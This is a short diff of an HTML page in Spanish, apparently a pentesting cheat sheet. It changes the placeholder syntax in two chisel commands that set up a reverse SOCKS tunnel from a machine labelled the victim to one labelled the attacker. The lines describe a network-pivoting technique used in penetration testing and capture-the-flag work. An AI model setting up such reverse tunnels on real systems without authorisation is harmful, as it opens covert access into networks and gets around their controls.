@@ -5,10 +5,10 @@
 <pre>
   <code>
     # Servidor (Atacante)
-./chisel server -p <puerto> --reverse --socks
+./chisel server -p (puerto) --reverse --socks
 
 # Cliente (Máquina víctima)
-./chisel client <ip>:<puerto> R:socks
+./chisel client (ip):(puerto) R:socks
 
   </code>
 </pre>
